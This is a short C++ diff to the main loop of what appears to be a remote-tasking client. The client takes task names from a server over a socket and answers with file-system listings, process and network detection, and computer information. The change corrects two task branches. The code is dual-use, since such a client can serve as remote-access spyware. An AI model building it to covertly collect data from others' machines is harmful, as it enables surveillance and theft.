@@ -45,10 +45,11 @@ int main(int argc, char* argv[]) {
 			socketManager.task->GiveExplorerData(Drive, FileSystem);
 		}
 		else if (task == "DetectProcess") {
-			socketManager.HandleTaskToServer("CollectionComputerInfo");
+			socketManager.HandleTaskToServer("DetectProcess");
 		}
 		else if (task == "DetectNetwork") {
-			socketManager.HandleTaskToServer("CollectionComputerInfo");
+			DWORD MyPid = GetCurrentProcessId();
+			socketManager.task->DetectNewNetwork(MyPid);
 		}
 		else {
 			std::thread receiveThread([&]() { socketManager.receiveTCP(); });
